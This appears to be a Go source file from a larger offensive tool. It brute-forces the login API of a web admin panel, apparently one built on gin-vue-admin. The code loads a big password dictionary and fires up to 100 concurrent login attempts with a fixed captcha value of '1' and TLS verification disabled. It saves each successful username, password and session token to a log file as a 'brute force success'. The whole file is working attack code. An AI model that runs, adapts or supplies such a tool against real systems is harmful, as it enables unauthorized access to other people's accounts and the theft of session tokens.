package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/vbauerster/mpb/v7"
	"github.com/vbauerster/mpb/v7/decor"
	"golang.org/x/sync/semaphore"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

var successLog *os.File
var (
	maxGoroutines = 100 // 最大并发数
	sem           = semaphore.NewWeighted(int64(maxGoroutines))
)

type LoginRequest struct {
	Username  string `json:"username"`
	Password  string `json:"password"`
	Captcha   string `json:"captcha"`
	CaptchaId string `json:"captchaId"`
}

type LoginResponse struct {
	Code int `json:"code"`
	Data struct {
		User struct {
			ID          int    `json:"ID"`
			CreatedAt   string `json:"CreatedAt"`
			UpdatedAt   string `json:"UpdatedAt"`
			Uuid        string `json:"uuid"`
			UserName    string `json:"userName"`
			NickName    string `json:"nickName"`
			SideMode    string `json:"sideMode"`
			HeaderImg   string `json:"headerImg"`
			BaseColor   string `json:"baseColor"`
			ActiveColor string `json:"activeColor"`
			AuthorityId int    `json:"authorityId"`
			Phone       string `json:"phone"`
			Email       string `json:"email"`
			Enable      int    `json:"enable"`
		} `json:"user"`
		Token     string `json:"token"`
		ExpiresAt int64  `json:"expiresAt"`
	} `json:"data"`
	Msg string `json:"msg"`
}

var Passwords []string

func init() {
	var err error
	successLog, err = os.OpenFile("success.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	file, err := os.Open("bigpasswdDict.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		Passwords = append(Passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func tryLogin(username, password string, Info *HostInfo, wg *sync.WaitGroup, p *mpb.Progress, bar *mpb.Bar) {
	defer wg.Done()
	defer sem.Release(1)
	defer bar.Increment()
	reqBody := &LoginRequest{
		Username:  username,
		Password:  password,
		Captcha:   "1",
		CaptchaId: "1",
	}
	reqBodyBytes, err := json.Marshal(reqBody)
	if err != nil {
		log.Fatal(err)
	}

	// 创建一个新的 HTTP 客户端，禁用 SSL 证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	url := Info.Url + "/api/base/login"
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(reqBodyBytes))
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	// 如果 HTTP 响应的状态码为 404，更改 URL 并重新发送请求
	if resp.StatusCode == 404 {
		url = Info.Url + "/base/login"
		resp, err = client.Post(url, "application/json", bytes.NewBuffer(reqBodyBytes))
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
	}

	var respBody LoginResponse
	err = json.NewDecoder(resp.Body).Decode(&respBody)
	if err != nil {
		log.Fatal(err)
	}

	if respBody.Msg == "登录成功" {
		successMsg := fmt.Sprintf("爆破成功! 用户名: %s, 密码: %s, Token: %s\n", username, password, respBody.Data.Token)
		fmt.Println(successMsg)
		if _, err := successLog.WriteString(successMsg); err != nil {
			log.Println("Error writing to success log:", err)
		}
	}
}

func tryLogin2(username, password string, Info *HostInfo, wg *sync.WaitGroup, p *mpb.Progress, bar *mpb.Bar) {
	defer wg.Done()
	defer sem.Release(1)
	defer bar.Increment()
	reqBody := &LoginRequest{
		Username:  username,
		Password:  password,
		CaptchaId: "1",
	}
	reqBodyBytes, err := json.Marshal(reqBody)
	if err != nil {
		log.Fatal(err)
	}

	// 创建一个新的 HTTP 客户端，禁用 SSL 证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	url := Info.Url + "/api/base/login"
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(reqBodyBytes))
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	// 如果 HTTP 响应的状态码为 404，更改 URL 并重新发送请求
	if resp.StatusCode == 404 {
		url = Info.Url + "/base/login"
		resp, err = client.Post(url, "application/json", bytes.NewBuffer(reqBodyBytes))
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
	}

	var respBody LoginResponse
	err = json.NewDecoder(resp.Body).Decode(&respBody)
	if err != nil {
		log.Fatal(err)
	}

	if respBody.Msg == "登录成功" {
		successMsg := fmt.Sprintf("爆破成功! 用户名: %s, 密码: %s, Token: %s\n", username, password, respBody.Data.Token)
		fmt.Println(successMsg)
		if _, err := successLog.WriteString(successMsg); err != nil {
			log.Println("Error writing to success log:", err)
		}
	}
}

func credentialStuffing1(Info *HostInfo) {
	var wg sync.WaitGroup
	p := mpb.New(mpb.WithWaitGroup(&wg))
	totalAttempts := len(Username) * len(Passwords)
	bar := p.AddBar(int64(totalAttempts), mpb.PrependDecorators(
		decor.CountersNoUnit("%d / %d", decor.WCSyncSpace),
	))

	for _, username := range Username {
		for _, password := range Passwords {
			if err := sem.Acquire(context.Background(), 1); err != nil {
				log.Printf("Failed to acquire semaphore: %v", err)
				continue
			}

			wg.Add(1)
			go tryLogin(username, password, Info, &wg, p, bar)

			// 在每个请求之间添加延迟
			time.Sleep(2 * time.Millisecond)
		}
	}

	p.Wait()
}

func credentialStuffing2(Info *HostInfo) {
	var wg sync.WaitGroup
	p := mpb.New(mpb.WithWaitGroup(&wg))
	totalAttempts := len(Username) * len(Passwords)
	bar := p.AddBar(int64(totalAttempts), mpb.PrependDecorators(
		decor.CountersNoUnit("%d / %d", decor.WCSyncSpace),
	))

	for _, username := range Username {
		for _, password := range Passwords {
			if err := sem.Acquire(context.Background(), 1); err != nil {
				log.Printf("Failed to acquire semaphore: %v", err)
				continue
			}

			wg.Add(1)
			go tryLogin2(username, password, Info, &wg, p, bar)

			// 在每个请求之间添加延迟
			time.Sleep(2 * time.Millisecond)
		}
	}

	p.Wait()
}
